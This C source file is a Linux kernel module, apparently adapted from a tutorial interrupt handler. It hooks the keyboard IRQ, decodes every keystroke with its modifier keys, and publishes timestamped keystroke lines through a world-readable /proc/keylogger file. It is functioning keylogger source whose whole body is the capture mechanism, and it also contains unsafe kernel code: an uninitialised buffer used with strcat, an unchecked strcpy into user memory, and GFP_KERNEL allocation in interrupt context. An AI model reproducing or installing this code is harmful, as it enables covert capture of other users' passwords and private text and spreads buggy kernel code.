/* starter code from http://bootloader.wikidot.com/linux:kernel:ldd:intrpt*/
/*
 * intrpt.c - An interrupt handler.
 *
 * Copyright (C) 2001 by Peter Jay Salzman
 */
 
/*
 * The necessary header files
 */
 
/*
 * Standard in kernel modules
 */

/***Modified by ALAN CLEETUS***/
/***Last Modified on 12/06/2019***/

#include <linux/kernel.h>       /* We're doing kernel work */
#include <linux/module.h>       /* Specifically, a module */
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h>    /* We want an interrupt */
#include <asm/io.h>

#include <linux/proc_fs.h>  
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/time.h>
#include <asm/uaccess.h>


#define MY_WORK_QUEUE_NAME "WQsched.c"
#define BUFFER_SIZE 120 	//buffer will never hold more that 80 characters but for insurance make the size 120

/*this proc file will hold the last logged key data*/
struct proc_dir_entry *keylogger;

static char log_buffer[BUFFER_SIZE]; 	//updated as keys are logged
static char output[200];				//contents of keylogger proc file

/********************* start keymapping related variables *********************/
bool shift_flag = false;
bool ctrl_flag = false;
bool alt_flag = false;
bool capslock = false;
unsigned long last_caps_time = 0;

/*TODO: (future improvement) implement keymap using hashtable*/
char* lower_case_key_map[16][16] = {
{"","ESC","1","2","3","4","5","6","7","8","9","0","-","=","^H","	"},
{"q","w","e","r","t","y","u","i","o","p","[","]","\n","","a","s"},
{"d","f","g","h","j","k","l",";","'","","","","z","x","c","v"},
{"b","n","m",",",".","/","","",""," ","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""}
};

char* upper_case_key_map[16][16] = {
{"","ESC","!","@","#","$","%","^","&","*","(",")","_","+","^H","	"},
{"Q","W","E","R","T","Y","U","I","O","P","{","}","\n","","A","S"},
{"D","F","G","H","J","K","L",":","\"","","","","Z","X","C","V"},
{"B","N","M","<",">","?","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""},
{"","","","","","","","","","","","","","","",""}
};

/********************* end keymapping related variables *********************/

static struct workqueue_struct *my_workqueue; 
typedef struct {
	struct work_struct my_work;
	unsigned char x;
} my_work_t;

my_work_t *work;

/*this function is called everytime a button is pressed.
AKA bottom half of driver.
*/
static void got_char(struct work_struct *work)
{
	my_work_t *my_work = (my_work_t *)work;

	char scancode = (my_work->x) ? my_work->x : 0;

	//checking if capslock clicked  
	if((scancode & 0x7F)==0x3A)
	{
		struct timeval curr_time;
		do_gettimeofday(&curr_time);
		
		if(curr_time.tv_sec - last_caps_time >1){
			capslock = !capslock;	
			last_caps_time = curr_time.tv_sec;
		}	
	}
	//on key depress
	else if((scancode & 0x80))
	{
		//left shift or right shift released
	  	if((scancode & 0x7F)==0x2A||(scancode & 0x7F)==0x36){
	  		shift_flag = false;
	  	}
	  	//ctrl key realesed
	  	else if((scancode & 0x7F)==0x1D){
				ctrl_flag = false;	
		}
		//alt key realeased
		else if((scancode & 0x7F)==0x38){ 
			alt_flag = false;	
		}	
	}
	//on key press
	else
	{
		//shift left or right pressed
		if((scancode & 0x7F)==0x2A||(scancode & 0x7F)==0x36){
			shift_flag = true;	
		}
		//ctrl key pressed
		else if((scancode & 0x7F)==0x1D){ 
			ctrl_flag = true;	
		}
		//alt key pressed
		else if((scancode & 0x7F)==0x38){ 
			alt_flag = true;	
		}
		//one of the other keys pressed
		else{

			/*printk(KERN_INFO "Scan Code =  %x %x.\n",
			 (scancode & 0x7F)>>4,
			 (scancode & 0x0F));*/
			 
			//decode key pressed using key mapping
			int x = (int)(scancode & 0x7F)>>4;
			int y = (int)(scancode & 0x0F);

			char* key = ((capslock && !shift_flag)||(!capslock && shift_flag)) ? upper_case_key_map[x][y]: lower_case_key_map[x][y];
			
			if(key !=""){
				//genereate string for logging
				char final_string[30];
				
				if(alt_flag)	strcat(final_string, "ALT+");
				if(ctrl_flag)	strcat(final_string, "CTRL+");
				
				strcat(final_string, key);
		
				//calculate buff size
				size_t curr = strlen(log_buffer)+strlen(final_string);
		
				// if buff size is more than 80 characters of the enter key is pressed then update proc file and reset byffer		
				if(curr>80 || key=="\n")
				{
					//get current time and date
					struct timeval tv;
					struct tm my_tm;

					do_gettimeofday(&tv); 

					time_to_tm(tv.tv_sec, 0, &my_tm);
					
					sprintf(output, "%02d-%02d-%04ld %02d:%02d:%02d %s\n",
					my_tm.tm_mon+1,
					my_tm.tm_mday,  
					my_tm.tm_year+1900,
					my_tm.tm_hour, 
					my_tm.tm_min, 
					my_tm.tm_sec,
					log_buffer
					); 
					
					//reset log_buffer
					memset(log_buffer, 0, sizeof(log_buffer));
					
					//printk(KERN_INFO "Outputting: %s",output);
					
				}else
				{
					strcat(log_buffer, final_string);
					//printk(KERN_INFO "Log Buffer: %s",log_buffer);
				}
			}
		}
  }
 
  kfree( (void *)work );

  return;
}
  
  
/* 
	This function is called when a user tries to read the proc file /proc/keylogger.
	All it does is return the contents of the "output" variable.
*/
static ssize_t proc_read(struct file *fp, char *buf, size_t len, loff_t * off)
{	static int finished=0; if(finished) {finished=0;return 0;} finished=1;
    
 	strcpy(buf, output);
	
	return strlen(buf);
}

static struct file_operations keylogger_fops = { .owner=THIS_MODULE, .read=proc_read,  };


/*
 * This function services keyboard interrupts. It reads the relevant
 * information from the keyboard and then puts the non time critical
 * part into the work queue. This will be run when the kernel considers it safe.
 */
irqreturn_t irq_handler(int irq, void *unknown)
{
  /*
   * This variables are static because they need to be
   * accessible (through pointers) to the bottom half routine.
   */ 
  static unsigned char scancode; 
  unsigned char status;
  /*
   * Read keyboard status
   */
  status = inb(0x64);
  scancode = inb(0x60); 
 
  work = (my_work_t *)kmalloc(sizeof(my_work_t), GFP_KERNEL);

	if(work)
	{ 
 	   	INIT_WORK((struct work_struct *)work, got_char);
 	   	work->x = scancode;
		queue_work(my_workqueue, (struct work_struct *)work);
  }
  
  return IRQ_HANDLED;
}
 
/*
 * Initialize the module - register the IRQ handler
 */
int init_module()
{
	my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME); 

	keylogger = proc_create( "keylogger", 0666, NULL, &keylogger_fops); 
	if(keylogger==NULL) {	printk(KERN_ALERT "Error: Could not initialize %s\n", "keylogger"); }

	//free_irq(1, NULL);	//we dont need to do this because im using IRQF_SHARED
	
	return request_irq(1,    /* The number of the keyboard IRQ on PCs */
         irq_handler, /* our handler */
         IRQF_SHARED, 
         "my_keyboard_irq_handler",
         (void *)(irq_handler));
}
 
/*
 * Cleanup
 */
void cleanup_module()
{
	flush_workqueue( my_workqueue );
	destroy_workqueue( my_workqueue ); 
	remove_proc_entry("keylogger", NULL); 

	//free_irq(1, NULL);// we dont need this b/c of IRQF_SHARED

	free_irq(1, (void *)(irq_handler));   
}
 
MODULE_LICENSE("GPL");
